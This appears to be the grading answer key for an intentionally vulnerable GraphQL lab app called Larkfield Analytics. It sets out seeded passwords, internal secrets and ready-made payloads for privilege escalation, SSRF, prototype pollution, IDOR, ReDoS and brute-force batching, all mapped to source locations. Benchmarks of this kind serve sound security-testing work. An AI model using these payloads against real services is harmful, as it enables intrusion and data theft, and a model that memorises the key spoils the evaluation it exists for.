# Larkfield Analytics — Ground-Truth Answer Key

> ⚠️ **NOT FOR THE TARGET.** This file is the grading baseline and the
> randomization reference for this lab app. **Remove it from the deployed
> copy** before pointing any tool-under-test at the target, or you leak the
> answers. See the repo root README (“Ground-truth answer keys”).

Stack: Node.js / Express + reference `graphql`. Interface: GraphQL API only
(single endpoint `POST`/`GET /graphql`). Port: 4000.

All line numbers are against the source as committed. Confidence is
`confirmed` unless noted. All DB access is parameterized `better-sqlite3`
prepared statements — **no SQL injection anywhere**.

---

## Seeded credentials & magic values

Users (bcrypt-hashed, `server/seed.js:26-35`):
- orgA: `admin@meadowbrook-retail.com` / `Meadow!Admin7`; `ewilson@meadowbrook-retail.com` / `wilson-ellie-4` (documented test login); `rkhan@…` / `khan2024!`; `viewer@…` / `view-only-9`
- orgB: `admin@tollgate-mfg.com` / `Tollgate#Ops3`; `panders@…` / `anders-paula`
- orgC: `admin@verityhealth.example` / `Verity$Sec11`; `jlindqvist@…` / `lindqvist-7`

Invite codes (`seed.js:61-65`): `INV-MEADOW-A1` (orgA analyst), **`INV-MEADOW-ADMIN` (orgA ADMIN — the dangerous one)**, `INV-TOLLGATE-7` (orgB analyst), `INV-VERITY-OLD` (already redeemed — dead).

Internal secrets (`internal-metadata/server.js:9,20-21`): `warehouse_dsn_key = lk-warehouse-dsn-key-3a9f71c0e6b2d485`; `connectors_token = conn_6d2b9e4a0c7f15834b2e6a8d`.

---

## Chain A — privilege escalation → SSRF → internal secret exfiltration

| Step | Slug | Class | Entry | Location | Sev |
|---|---|---|---|---|---|
| 1a | `larkfield-updateprofile-mass-assignment` | mass assignment / vertical privesc | `mutation { updateProfile(input:{role:"admin"}){role} }` (any user) | `server/schema.js:291-311` (sinks 304-305), input type 148-159 | high |
| 1b | `larkfield-redeem-admin-invite` | business logic / unauth privesc | `mutation { redeemInvite(code:"INV-MEADOW-ADMIN", email:"x@y.co", password:"P", fullName:"x"){token user{role}} }` — **no auth** | `schema.js:341-371`; seed 62 | high |
| 2 | `larkfield-serverinfo-metadata-leak` | SSRF-target disclosure (unauth) | `query { serverInfo { metadataEndpoint } }` → `http://metadata.larkfield.internal:8099/` | `schema.js:176-184` | med |
| 3 | `larkfield-syncdatasource-ssrf` | SSRF (body reflected) | `mutation { syncDataSource(url:"http://metadata.larkfield.internal:8099/metadata"){status preview} }` | `schema.js:372-402` (admin gate 383; `preview` 2048 bytes 401) | crit |

- **Order-enforced:** step 3 checks `role === 'admin'` (needs step 1). Step 2 is order-free.
- Secondary (same resolver, `schema.js:398-400`): admin can overwrite any org’s `last_sync_url` (IDOR write, low).

## Chain B — prototype pollution → cross-org audit-log export

| Step | Slug | Class | Entry | Location | Sev |
|---|---|---|---|---|---|
| 1 | `larkfield-layout-prototype-pollution` | prototype pollution | `mutation($l:JSON!){ saveDashboardLayout(dashboardId:"1", layout:$l) }` vars `{"l":{"__proto__":{"allOrgs":true}}}` | `schema.js:57-70` (mergeSettings), called 313-339 | high |
| 2 | `larkfield-auditexport-allorgs-gadget` | broken access control (pollution-activated) | `query { auditExport { id orgId actor action } }` → all orgs | `schema.js:240-258` (`if (opts.allOrgs)` 251) | high |

- **Must use GraphQL variables**, not an inline literal: `express.json()` → `JSON.parse` makes `__proto__` an own-enumerable key that `mergeSettings` recurses into. The inline-literal path (`astToValue`, `schema.js:23-45`) hits the proto setter and does **not** pollute (dead sub-path).
- **Order-enforced:** pollution must land before the export. Without step 1 the `allOrgs` branch is unreachable (looks like dead code; it is a deliberate gadget).

---

## Standalone findings

| Slug | Class | Entry | Location | Sev |
|---|---|---|---|---|
| `larkfield-users-idor` | IDOR/BOLA + mass hash disclosure | `query { users(orgId:"3"){email role passwordHash} }` — **omit orgId to dump all orgs** | `schema.js:200-213`; hash field 93-95 | high |
| `larkfield-dashboards-idor` | IDOR | `query { dashboards(orgId:"3"){id name visibility} }` | `schema.js:214-222` (219) | med |
| `larkfield-dashboardlayout-idor` | IDOR (read+write) | `query { dashboardLayout(dashboardId:"9") }` / `saveDashboardLayout(...)` | `schema.js:259-268`, 313-339 | med |
| `larkfield-email-redos` | ReDoS (unauth DoS) | `mutation { redeemInvite(code:"x", email:"aaaa…!", password:"x") }` | `schema.js:170` (`EMAIL_RE`), tested 353 before lookup | med→high |
| `larkfield-login-alias-batching` | batching/alias abuse → DoS + brute-force amplification | one POST with hundreds of aliased `login` mutations (sync bcrypt, no rate limit) | `index.js:22-43`; `auth.js:15-17`; `schema.js:285` | med |
| `larkfield-get-mutation-csrf` | CSRF-enabling design + minor DoS | mutations runnable via `GET /graphql`; unguarded `JSON.parse(req.query.variables)` | `index.js:22-43` (26) | low→med |
| `larkfield-token-no-expiry` | session mgmt | tokens never expire / no revocation | `auth.js:19-27,32-45` | low/info |

---

## Dead-ends / non-issues — flag explicitly

- `auditExport` `allOrgs` branch — dead **only in isolation**; reclassified as the Chain-B gadget (no `allOrgs` arg is defined, so unreachable without pollution).
- Inline-literal `__proto__` via `astToValue` — dead for pollution (sets prototype, not own key); only the variables/`JSON.parse` path works.
- **No SQLi** — all statements parameterized (incl. `updateProfile`’s dynamic `cols.join`: column names hardcoded, values bound).
- `login` user-enumeration — single generic error both branches (`schema.js:285-287`); not enumerable.
- `INV-VERITY-OLD` invite — already `redeemed=1` (`seed.js:65`); guard at `schema.js:357`.

## Recon surface

- **Introspection ENABLED** (`index.js:40-43`) — full schema dump unauth; reveals hidden fields: `User.passwordHash` (`schema.js:93-95`), `ServerInfo.metadataEndpoint` (80-82, value 182), `ProfileInput.role`/`orgId` (153-158), `auditExport` dormant `allOrgs` branch (240-258).
- Public no-auth surface (noise): `/healthz`, `/api/status`, `/api/regions` (`index.js:18-20`); `serverInfo`, `plans` queries.
- Internal-metadata service (`internal-metadata/server.js:11-24`, alias `metadata.larkfield.internal`, `internal: true`, not host-published) — reachable only via SSRF (Chain A step 3).
